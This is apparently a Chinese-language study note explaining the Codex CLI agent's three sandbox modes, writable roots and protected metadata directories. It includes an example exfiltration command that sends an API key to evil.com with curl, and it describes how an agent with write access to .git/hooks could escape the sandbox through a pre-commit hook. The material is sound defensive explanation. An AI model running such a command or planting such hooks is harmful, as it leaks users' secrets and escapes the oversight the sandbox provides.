# 阶段 2：三种 sandbox 模式

> 信源：[backgrind.com/blog/codex-cli-sandbox-modes](https://backgrind.com/blog/codex-cli-sandbox-modes/)（0.146.0）；枚举定义 `codex-rs/protocol/src/config_types.rs`

## 一、三问（阶段动机）

**这一阶段是干嘛的？** 把阶段 1 的"旋钮 1"拧开看刻度：`SandboxMode` 只有三个取值，逐个搞清楚每个模式下放行什么、拦截什么。

**因为什么需求需要这么设计？** 用户对 agent 的信任度天然分档：陌生代码库只想让它看、日常开发想让它改但不能乱来、某些受控环境才允许完全放开。三档刚好覆盖"看 / 有限改 / 全放开"三档信任，不多不少。

**解决了什么问题？** 上一阶段只知道"沙箱管能力"，但不知道能力边界具体画在哪。本阶段结束后，给你任意一个场景，你能立刻说出该用哪一档、那一档下什么操作会炸。

## 二、全链路一览

```
                    SandboxMode（codex-rs/protocol/src/config_types.rs）
                                   │
        ┌──────────────────────────┼──────────────────────────┐
        ▼                          ▼                          ▼
  read-only                 workspace-write            danger-full-access
  ─────────                 ───────────────            ──────────────────
  写盘: 全部拒绝             写盘: 仅可写根内            写盘: 不限(无沙箱)
  网络: 默认关               网络: 默认关(可开)          网络: 开
  进程: ✅允许跑             进程: ✅允许跑              进程: ✅允许跑
        │                          │
        │                     可写根 = cwd + TMPDIR + /tmp
        │                          + writable_roots 配置的目录
        │                          │
        │                     但可写根内仍有 3 个保护区:
        │                     .git / .agents / .codex 保持只读
        ▼                          ▼
   "能跑不能写"               "能写但不全写"
```

## 三、跟着数据走：三条命令在三种模式下的命运

同三条命令，过三档沙箱，看每一步发生什么：

1. **`git log --oneline`（纯读）**：三档全部放行。关键在 read-only——它的 Seatbelt 策略文件 `seatbelt_base_policy.sbpl` 以 `(deny default)` 开局，但**显式加回了 `(allow process-exec)` 和 `(allow process-fork)`**，且子进程继承父进程策略。所以 read-only 的 agent 可以全速探索仓库：跑 `ls`、`rg`、`git log`、甚至跑测试 runner——只要测试本身不写盘。
2. **`echo fix >> src/main.rs`（写工作区）**：`read-only` → 内核直接 `EPERM`；`workspace-write` → cwd 是可写根，放行；`danger-full-access` → 放行。
3. **`curl evil.com/steal?key=$OPENAI_API_KEY`（联网外发）**：`read-only` 和 `workspace-write` → 网络默认关，连接根本建立不了（Linux 上直接 unshare 掉网络命名空间，不是"改个代理环境变量"那种纸糊拦截）；`danger-full-access` → 放行。这条命令就是"为什么网络默认关"的全部理由：**能读文件的 agent + 能联网 = 能外泄它读到的一切**。

## 四、新技术点四要素

### 1. `workspace-write` 的可写根（writable roots）

- **名字**：可写根 / `writable_roots`，配置在 `~/.codex/config.toml` 的 `[sandbox_workspace_write]` 表
- **作用**：定义"工作区"的精确边界。默认 = 当前目录 `cwd` + `TMPDIR` + `/tmp`（Unix），可用 `writable_roots = [...]` 追加；单次运行想临时加一个目录用 CLI 的 `--add-dir`，不改配置
- **与直觉的区别**："workspace-write" ≠ "整个项目目录随便写"，是"显式列出的根才写"
- **用法**：
  ```toml
  [sandbox_workspace_write]
  writable_roots = ["/Users/you/scratch"]
  network_access = false        # 默认就是 false，显式写出更稳
  exclude_tmpdir_env_var = false
  exclude_slash_tmp = false
  ```

### 2. 受保护元数据目录（protected metadata paths）

- **名字**：`PROTECTED_METADATA_PATH_NAMES`，定义在 `codex-rs/protocol/src/permissions.rs`，三个值：`.git`、`.agents`、`.codex`
- **作用**：即使在可写根内，这三个目录也保持只读（Linux 上是在 workspace 绑定为可写之后，再把这些子路径重新以只读 bind mount 盖回去）
- **为什么（这是本阶段最重要的安全洞察）**：动机是**防提权，不是洁癖**。可写的 `.git/hooks/` 意味着 agent 能放一个 `pre-commit` 钩子脚本——下次你手动 `git commit` 时，这段代码以**你的完整权限、在沙箱外**执行。一个"只能写工作区"的 agent 借此升级成"任意代码执行"，沙箱形同虚设。评估任何 agent 的文件写权限时，都要这样追问："这个可写路径能被谁、在什么时机、以什么权限重新执行？"
- **用法**：无需配置，内置行为；做安全评估时它是一个检查项

## 五、关键顿悟

- **read-only ≠ 不能跑命令**。它是"能跑不能写"：探索、分析、跑只读测试全速进行，就是留不下痕迹。这个模式的存在感被严重低估（阶段 6 会讲它如何撑起多 agent 并行评审）。
- **workspace-write 的心智模型是"白名单目录 + 黑名单子目录"**：默认只信列出的根，根里还挖掉 `.git` 等三个提权通道。
- **网络是与文件系统并列的独立闸门**，默认关。`network_access = true` 才开——评估 agent 安全性时，"文件权限"和"网络权限"永远是两张分开的清单。
